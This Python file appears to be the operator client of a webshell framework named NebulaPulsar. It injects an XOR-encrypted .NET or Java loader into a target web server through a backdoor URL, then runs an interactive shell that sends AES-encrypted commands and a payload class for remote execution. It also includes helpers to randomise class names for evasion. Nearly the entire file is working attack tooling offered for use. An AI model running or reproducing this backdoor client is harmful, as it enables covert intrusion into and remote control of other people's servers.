import requests
import struct
import random
import string
import argparse
import sys
import os

from Cryptodome.Cipher import AES
from Cryptodome.Util.Padding import pad, unpad

MAGIC_NEBULAPULSAR = 'NebulaPulsar'
MAGIC_PAYLOAD = 'DarkMatter'

MAGIC_CSHARP = 'dll'
MAGIC_JAVA = 'class'

MAGIC_SUCCESS = 'LOADER_INIT_SUCCESS'
MAGIC_EXIST = 'LOADER_ALREADY_EXISTS_RESPONSE'

KEY = b'NBPULSARDEADBEEF'

parser = argparse.ArgumentParser()
parser.add_argument('--url', type=str, help='Backdoor URL')
parser.add_argument('--script', type=str, help='Script type (ex. cs, java)')
parser.add_argument('--volatile', type=bool, default=True, help='Enable volatile mode for NebulaPulsar')
parser.add_argument('--encoding', type=str, default='utf-8', help='HTTP encoding (default: UTF-8)')
parser.usage = f'{sys.argv[0]} --url <Target URL> --script java'
args = parser.parse_args()

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    RESET = '\033[0m'

def print_logs(msg: str):
    print(f'{Colors.BLUE}[*]{Colors.RESET} {msg}')

def print_success(msg: str):
    print(f'{Colors.GREEN}[+]{Colors.RESET} {msg}')

def print_error(msg: str):
    print(f'{Colors.RED}[-]{Colors.RESET} {msg}')

def xor_encrypt(buffer: bytes) -> bytes:
    result = bytearray()
    for i in range(len(buffer)):
        result.append(buffer[i] ^ KEY[(i + 1) & 15])

    return bytes(result)

def aes_encrypt(buffer: bytes) -> bytes:
    cipher = AES.new(KEY, AES.MODE_ECB)
    return cipher.encrypt(pad(buffer, 16))

def aes_decrypt(buffer: bytes) -> bytes:
    cipher = AES.new(KEY, AES.MODE_ECB)
    return unpad(cipher.decrypt(buffer), 16)

def obfus_class_name(class_bytes: bytes, name: str = 'DarkMatter'):
    new_name = ''.join(random.choices(string.ascii_letters, k=len(name)))
    patched_bytes = class_bytes.replace(name.encode('utf-8'), new_name.encode('utf-8'))

    return patched_bytes

def do_cmd(session, payload: str):
    with open(payload, 'rb') as f:
        payload_bytes = f.read()

    while True:
        try:
            cmd = input('> ')
            if cmd.strip().lower() in ['exit', 'quit']:
                print_logs("Sending UNLOAD signal to clear memory...")
                param = 'action=UNLOAD'
                raw_payload = struct.pack('>I', 0) + param.encode('utf-8')
                encrypted_payload = aes_encrypt(raw_payload)
                
                headers = {'Content-Type': 'application/octet-stream'}
                resp = session.post(args.url, data=encrypted_payload, headers=headers)
                print_success(f"Server response: {resp.text.strip()}")
                break
            if not cmd.strip():
                continue

            param_str = f'action=CMD&cmd={cmd}&mode=' + ('volatile' if args.volatile else 'persistent')

            dynamic_bytes = payload_bytes # obfus_class_name(payload_bytes, MAGIC_PAYLOAD)
            class_len = len(dynamic_bytes)

            raw_payload = struct.pack('>I', class_len) + dynamic_bytes + param_str.encode('utf-8')
            encrypted_payload = aes_encrypt(raw_payload)

            headers = {
                'Content-Type': 'application/octet-stream'
            }

            resp = session.post(args.url, data=encrypted_payload, headers=headers)

            try:
                resp_text = aes_decrypt(resp.content).decode(args.encoding)
                print(resp_text)
            except Exception as ex:
                print(resp.text)

        except KeyboardInterrupt:
            break
        except Exception as ex:
            print(str(ex))
            break

    return

def main():
    # check arguments
    if not (args.url and args.script) or args.script not in ['cs', 'java']:
        parser.print_help()
        exit()

    # check payloads
    
    pulsar = f'{MAGIC_NEBULAPULSAR}.' + ('dll' if args.script == 'cs' else 'class')
    payload = f'{MAGIC_PAYLOAD}.' + ('dll' if args.script == 'cs' else 'class')

    pulsar = f'./payloads/{pulsar}'
    payload = f'./payloads/{payload}'

    if not os.path.exists(pulsar):
        print_error('File not found: ' + pulsar)
        exit()

    if not os.path.exists(payload):
        print_error('File not found: ' + payload)
        exit()

    # print banner
    print()
    
    print_logs(f'--------------------[ NebulaPulsar ]--------------------')
    print_logs(f'Author:    iss4cf0ng/ISSAC')
    print_logs(f'GitHub:    https://github.com/iss4cf0ng/NebulaPulsar')
    
    print('')

    print_logs(f'URL:       {args.url}')
    print_logs(f'Script:    {args.script}')
    print_logs(f'Volatile:  {"True" if args.volatile else "False"}')
    print_logs(f'Encoding:  {args.encoding}')

    print('')
    
    print_logs(f'Pulsar:    {pulsar}')
    print_logs(f'Payload:   {payload}')
    
    print('')

    # start exploitation

    session = requests.Session()

    print_logs('Injecting...')

    with open(pulsar, 'rb') as f:
        pulsar_bytes = f.read()
    
    pulsar_bytes = xor_encrypt(pulsar_bytes)
    resp = session.post(args.url, data=pulsar_bytes)
    resp_text = resp.text.strip()

    print_logs('Response:\n\t' + resp_text)

    if MAGIC_SUCCESS in resp_text:
        print_success('NebulaPulsar is successfully injected!')
    elif MAGIC_EXIST in resp_text:
        print_success('NebulaPulsar exists!')
    else:
        print_error('Cannot inject NebulaPulsar')
        exit()

    print_success('--------------------------------------------------')
    print_success('---------------------[ WIN ]----------------------')
    print_success('--------------------------------------------------')

    print()

    do_cmd(session, payload)

if __name__ == '__main__':
    main()